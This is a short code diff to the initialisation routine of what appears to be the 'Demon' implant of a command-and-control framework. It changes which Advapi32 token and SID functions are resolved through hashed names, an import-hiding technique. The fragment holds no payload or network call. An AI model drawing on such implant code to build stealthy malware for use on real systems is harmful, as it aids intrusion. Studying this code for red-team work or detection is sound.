@@ -719,7 +719,6 @@ VOID DemonInit( VOID )
         Instance.Win32.LookupAccountSidW            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
         Instance.Win32.OpenThreadToken              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
         Instance.Win32.OpenProcessToken             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
-        Instance.Win32.ImpersonateLoggedOnUser      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_IMPERSONATELOGGEDONUSER );
         Instance.Win32.AdjustTokenPrivileges        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
         Instance.Win32.LookupPrivilegeNameA         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
         Instance.Win32.SystemFunction032            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
@@ -736,6 +735,8 @@ VOID DemonInit( VOID )
         Instance.Win32.LsaNtStatusToWinError        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
         Instance.Win32.EqualSid                     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_EQUALSID );
         Instance.Win32.ConvertSidToStringSidW       = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
+        Instance.Win32.GetSidSubAuthorityCount      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
+        Instance.Win32.GetSidSubAuthority           = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );
 
         PUTS( "Loaded Advapi32 functions" )
     }
